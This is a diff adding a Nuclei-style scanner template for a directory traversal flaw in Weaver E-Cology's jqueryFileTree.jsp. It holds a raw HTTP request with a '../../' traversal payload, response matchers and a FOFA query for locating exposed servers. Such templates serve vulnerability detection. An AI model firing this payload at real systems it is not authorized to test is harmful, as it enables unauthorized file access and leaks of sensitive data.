@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - title='新建目录'
+            - title='重命名目录'
+            - title='删除目录'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+id: WeaverE-Cology-jqueryFileTree_jsp-Directory-Traversal
+info:
+    author: Superhero
+    description: |-
+        fofa: app="泛微-OA（e-cology）"
+        泛微E Cology jqueryFileTree.jsp接口存在路径穿越漏洞，攻击者可访问或修改服务器文件系统中的任意文件，导致敏感信息泄露、系统被控制等严重后果‌。
+    name: 泛微E Cology jqueryFileTree.jsp 路径穿越漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/MUmsTO9dzYEgJ-HGhohCJA
+    severity: high
+    tags:
+        - Directory Traversal
+        - jQuery
